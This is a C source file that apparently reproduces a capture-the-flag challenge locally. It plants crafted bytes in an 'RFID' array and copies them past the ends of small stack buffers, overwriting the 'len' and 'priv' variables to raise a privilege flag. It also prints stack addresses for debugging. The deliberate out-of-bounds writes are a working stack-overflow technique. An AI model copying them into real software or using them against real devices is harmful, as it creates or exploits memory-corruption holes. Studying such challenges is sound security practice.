# include <stdio.h>
# include <stdint.h>
# include <string.h>
# include <limits.h>

    uint8_t RFID[1024];


	int main( void )
	{
		int32_t i; // [sp+54h] [bp+54h]
		int32_t j; // [sp+4Ch] [bp+4Ch]
		uint8_t buff[8]; // [sp+14h] [bp+14h]
		int32_t *p; // [sp+10h] [bp+10h]
		int32_t d; // [sp+Ch] [bp+Ch]
		int32_t priv; // [sp+8h] [bp+8h]
		int32_t len; // [sp+4h] [bp+4h]
		uint8_t buff2[1]; // [sp+0h] [bp+0h]
		
		
		printf("buff2 = %x\n", buff2);
		printf("&len  = %x\n", &len);
		printf("&priv = %x\n", &priv);
		printf("&d    = %x\n", &d);
		printf("&p    = %x\n", &p); // 8 bytes
		printf("buff = %x\n", buff);
		printf("&j   = %x\n", &j);
		printf("size %x", sizeof(p));
		
		memset(buff, 0, 8);
		memset(RFID, 0, 1024);

		/* RFID memmory Definition START */
		RFID[879] = 1;
		RFID[832] = 1; // enable debug print
		
		
		// -28 starting from len
		// -24 starting from private
		RFID[641] = 0x100 - 12; 
		RFID[642] = 0xff; RFID[643] = 0xff; RFID[644] = 0xff;
		RFID[645] = 1;  // set priv to 1
		
		
		// set *p (we will overwrite that with p so who gives a damn)
		
		// set d
		RFID[719 - 5] = 0x11;
		RFID[719 - 6] = 0x11;
		RFID[719 - 7] = 0x11;
		RFID[719 - 8] = 0x11;
		
		// set private to 2
		RFID[719 - 9] = 0x00;
		RFID[719 - 10] = 0x00;
		RFID[719 - 11] = 0x00;
		RFID[719 - 12] = 0x02;
		
		/* RFID memmory Definition STOP */

		p = 0;
		d = 0;
		priv = 0;
		len = 1;

		for ( i = 0; i <= 7; ++i ){
			//printf("writing  %x to %x\n", RFID[i + 640], buff2 + i);
			buff2[i] = RFID[i + 640];
		}
		
		if ( RFID[879] & 1 )
		{
		  printf("len is %d\n\n", len);
		  
			for ( j = 0; j >= len; --j ){
				printf("%d = %x -- %x <- %x\n", j, &buff[j],buff[j], RFID[j+719]);
				buff[j] = RFID[j + 719];
				/*
				printf("\nj=%x (%x) %x\n", j, buff+j, RFID[j + 719]);
				printf("&buff2 = %x\n", buff2[0]);
				printf("buff = %x\n", buff[0]);
				printf("len = %x\n", len);
				printf("priv = %x\n", priv);
				printf("d = %x\n", d);
				
				*/
			}
		}
		
		printf("priv = %x\n", priv);
		
		printf("asigning to poitner\n");
		// *p = d;
		printf("solved it ^o^\n");


		if ( RFID[832] == 1 )
		{
		printf("%x\n",&d);
		printf("%x\n",d);
		printf("%x\n",&p);
		printf("%x\n",p);
		printf("%x\n",buff2);
		printf("p %x\n",&priv);
		printf("%d\n",len);
		printf("%x\n",&len);
		printf("%x\n",buff);
		}
		printf("Solved the fucking challenge\n");
		return 0;
		}
